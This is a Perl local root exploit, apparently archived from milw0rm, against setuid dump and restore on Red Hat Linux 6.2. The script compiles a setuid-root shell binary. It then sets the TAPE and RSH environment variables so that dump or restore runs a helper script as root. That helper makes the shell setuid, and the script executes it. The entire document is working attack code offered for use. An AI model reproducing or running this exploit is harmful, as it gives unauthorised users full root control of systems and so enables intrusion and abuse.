<html><head><title>Restore and Dump Local Exploit</title></head><pre>#!/usr/bin/perl

# perl exploit of restore and dump
# redhat linux 6.2
# written by tlabs
# Use at your discretion

$EXPORT1=&quot;TAPE=garbage:garbage&quot; ;
$EXPORT2=&quot;RSH=./hey&quot; ;

sub USAGE
{
  print &quot;$0 &lt;type&gt;\n1=dump 2=dump.static 3=restore 4=restore.staic\nYour choice innit;)\nWritten by Tlabs\n&quot; ;
  exit 0 ;
}

sub ERROR
{
  print &quot;$_[0]\n&quot; ;
  exit 0 ;
}

open(TEMP, &quot;&gt;shell.c&quot;)|| ERROR(&quot;Something went wrong:$!&quot;);
printf TEMP &quot;#include&lt;unistd.h&gt;\n#include&lt;stdlib.h&gt;\nint main()\n{&quot; ;
printf TEMP &quot;    setuid(0);\n\tsetgid(0);\n\texecl(\&quot;/bin/sh\&quot;,\&quot;sh\&quot;,0);\n\treturn 0;\n}&quot; ;
close(TEMP);
system &quot;cc -o shell shell.c&quot; ;
unlink &quot;shell.c&quot; ;
open(TEMP1, &quot;&gt;hey&quot;)|| ERROR(&quot;Something went wrong: $!&quot;);
printf TEMP1 &quot;#!/bin/sh\nchown root shell\nchmod 4755 shell&quot; ;
close(TEMP1);
chmod(0755, &quot;hey&quot;);

if ($ARGV[$0] eq &quot;1&quot;)
{
  $DUMPER=&quot;/sbin/dump&quot; ;
  if ( -u &quot;$DUMPER&quot; )
  {
    system &quot;export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \/&quot; ;
    sleep(3);
    if ( -u &quot;shell&quot; )
    {
      unlink &quot;hey&quot; ;
      system &quot;./shell&quot; ;
    }
    else
    {
      unlink &quot;hey&quot; ;
      unlink &quot;shell&quot; ;
      print &quot;Something fucked at the last, sorry&quot; ;
    }
   }
   else
   {
     unlink &quot;hey&quot; ;
     unlink &quot;shell&quot; ;
     printf &quot;Dump is not exploitable on this system\n&quot;;
   }
}
elsif ($ARGV[$0] eq &quot;2&quot;)
{
  $DUMPER=&quot;/sbin/dump.static&quot; ;
  if ( -u &quot;$DUMPER&quot; )
  {
    system &quot;export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \/&quot; ;
    sleep(3);
    if ( -u &quot;shell&quot; )
    {
      unlink &quot;hey&quot; ;
      system &quot;./shell&quot; ;
    }
    else
    {
      unlink &quot;hey&quot; ;
      unlink &quot;shell&quot; ;
      print &quot;Something fucked at the last, sorry&quot; ;
    }
  }
  else
  {
    unlink &quot;hey&quot; ;
    unlink &quot;shell&quot; ;
    printf &quot;Dump.static is not exploitable on this system\n&quot;;
  }
}
elsif ($ARGV[$0] eq &quot;3&quot;)
{
  $RESTORER=&quot;/sbin/restore&quot; ;
  if ( -u &quot;$RESTORER&quot; )
  {
    system &quot;export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i&quot; ;
    sleep(3);
    if ( -u &quot;shell&quot; )
    {
      unlink &quot;hey&quot; ;
      system &quot;./shell&quot; ;
    }
    else
    {
      unlink &quot;hey&quot; ;
      unlink &quot;shell&quot; ;
      print &quot;Something fucked at the last, sorry&quot; ;
    }
  }
  else
  {
    unlink &quot;hey&quot; ;
    unlink &quot;shell&quot; ;
    printf &quot;Restore is not exploitable on this system\n&quot;;
  }
}
elsif ($ARGV[$0] eq &quot;4&quot;)
{
  $RESTORER=&quot;/sbin/restore.static&quot; ;
  if ( -u &quot;$RESTORER&quot; )
  {
    system &quot;export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i&quot; ;
    sleep(3);
    if ( -u &quot;shell&quot; )
    {
      unlink &quot;hey&quot; ;
      system &quot;./shell&quot; ;
    }
    else
    {
      unlink &quot;hey&quot; ;
      unlink &quot;shell&quot; ;
      print &quot;Something fucked at the last, sorry&quot; ;
    }
  }
  else
  {
    unlink &quot;hey&quot; ;
    unlink &quot;shell&quot; ;
    printf &quot;Restore.static is not exploitable on this system\n&quot;;
  }
}
else
{
  USAGE ;
}


# milw0rm.com [2000-11-16]</pre></html>